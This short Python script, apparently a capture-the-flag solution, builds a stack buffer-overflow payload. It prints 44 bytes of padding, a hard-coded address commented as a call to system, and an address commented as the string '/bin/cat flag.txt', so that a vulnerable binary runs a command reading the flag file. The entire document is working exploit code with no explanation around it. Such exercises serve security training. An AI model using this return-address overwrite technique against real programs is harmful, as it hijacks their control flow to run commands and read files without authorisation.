
crash = "A"*44
system = "\x1a\x86\x04\x08" #call system
bincat = "\x30\xa0\x04\x08" #/bin/cat flag.txt 
print(crash+system+bincat)
